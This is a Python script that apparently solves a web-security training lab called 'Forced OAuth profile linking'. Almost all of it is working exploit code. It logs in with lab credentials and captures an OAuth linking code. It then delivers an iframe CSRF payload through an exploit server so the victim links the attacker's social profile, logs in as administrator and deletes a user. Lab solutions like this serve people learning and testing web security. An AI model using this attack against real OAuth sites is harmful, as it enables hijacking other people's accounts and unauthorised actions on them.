# Forced OAuth profile linking

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def send_payload(s, url, payload, attacker):
	post_exploit_path = attacker
	post_exploit_data = {
		"formAction": "STORE",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(1)
	post_exploit_data = {
		"formAction": "DELIVER_TO_VICTIM",
		"urlIsHttps": "on",
		"responseFile": "/exploit",
		"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
		"responseBody": payload
	}
	r = s.post(post_exploit_path, data=post_exploit_data)
	time.sleep(1)
	print('\n[+] Targeted endpoint or query parameter:\n    %s' % url)
	print('\n[+] Using payload:\n%s' % payload)
	print('\n[+] Delivered to the victim via:\t%s' % post_exploit_path + post_exploit_data['responseFile'])
	return r

def init_auth(s, url):
	print('\n[+] Trying to generate a linking code logging in as Wiener...')
	account_path = url + '/my-account'
	login_path = url + '/login'
	r = s.get(account_path)
	time.sleep(1)
	csrf_token = get_csrf_token(r)
	login_data = {'csrf': csrf_token, 'username': 'wiener', 'password': 'peter'}
	r = s.post(login_path, data=login_data)
	time.sleep(1)
	redirect_url = re.search(r"href='(.*)'>Attach a social profile", r.text).group(1)
	oauth_host = urllib.parse.urlparse(redirect_url).scheme + '://' + urllib.parse.urlparse(redirect_url).netloc
	print('\n[+] Found Redirection:\t%s' % redirect_url)
	print('\n[+] Found Oauth host:\t%s' % oauth_host)
	r = s.get(redirect_url)
	time.sleep(1)
	interaction_id = re.search(r'action="/interaction/(.*)/login" class=', r.text).group(1)
	print('\n[+] Found interaction id:\t%s' % interaction_id)
	login_path = f'{oauth_host}/interaction/{interaction_id}/login'
	login_data = {'username': 'peter.wiener', 'password': 'hotdog'}
	r = s.post(login_path, data=login_data)
	time.sleep(1)
	confirm_path = f'{oauth_host}/interaction/{interaction_id}/confirm'
	r = s.post(confirm_path, allow_redirects=False)
	time.sleep(1)
	print(r.headers['Location'])
	r = s.get(r.headers['Location'], allow_redirects=False)
	time.sleep(1)
	link = re.search(r'">(.*)</a>.', r.text).group(1)
	print('\n[+] Found Oauth link:\t%s' % link)
	return link

def delete_carlos(s, url, attacker, link):
	print('\n[+] Logging out...')
	file_path = url + '/exploit'
	r = s.get(url + '/logout')
	time.sleep(1)
	print('[+] Sending the link to the victim to link his account...')
	exploit_body = f'<iframe src="{link}"></iframe>'
	r = send_payload(s, file_path, exploit_body, 'https://' + attacker)
	time.sleep(7)
	r = s.get(url + '/my-account')
	if re.search(r"href='(.*)'>Login with social media", r.text):
		redirect_url = re.search(r"href='(.*)'>Login with social media", r.text).group(1)
		print('\n[+] Found Redirection:\t%s' % redirect_url)
		r = s.get(redirect_url)
		time.sleep(1)
		r = s.get(url + '/admin')
		if '/admin/delete' in r.text:
			print('[+] Trying to delete Carlos account...')
			r = s.get(url + '/admin/delete?username=carlos')

def find_exploit_srv(r):
	if re.search(r"href='(.*)'>Go to exploit server", r.text):
		srv = re.search(r"href='(.*)'>Go to exploit server", r.text).group(1)
		print('[+] Found Exploit server:\n\t%s' % srv)
		return srv

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Forced OAuth profile linking')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		exploit_srv = find_exploit_srv(r)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to take control of Administrator account...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			r = s.get(url)
			parsed_atk = urllib.parse.urlparse(exploit_srv)
			if parsed_atk.netloc == b'':
				print('[-] Cannot find exploit server... Already solved <!>')
				sys.exit(1)
			link = init_auth(s, url)
			time.sleep(2)
			r = delete_carlos(s, url, parsed_atk.netloc, link)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
